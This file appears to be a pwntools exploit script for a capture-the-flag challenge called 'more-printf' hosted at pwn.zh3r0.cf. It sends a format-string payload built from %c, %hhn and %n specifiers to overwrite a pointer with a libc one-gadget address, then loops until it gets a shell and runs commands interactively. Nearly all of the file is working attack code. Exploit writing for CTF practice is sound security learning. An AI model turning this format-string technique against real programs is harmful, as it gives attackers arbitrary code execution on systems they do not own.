#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.zh3r0.cf', 2222
binary = './more-printf'
brkpts = '''
b fprintf
c
fin
'''
#set{long}0x7fffffffdfa0=0x7fffffffdeb8

elf = ELF("more-printf")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if __name__ == "__main__":
    while True:
        io = process(binary)
        #io = remote(remote_ip, port)
        libc_to_gadget = 0xc3a2b
        #payload = "%d" + "%c"*3 + "%hhn" + "%*8$d" + "%{}c".format(libc_to_gadget - 8) + "%5$n"
        payload =  "%c"*3 + "%5d" + "%hhn" + "%*8$d" + "%{}c".format(libc_to_gadget - 8) + "%5$n"
        sl(payload)
        try:
            sleep(1)
            sl('ls')
            print(io.recv())
            io.interactive()
        except:
            io.close()
            continue
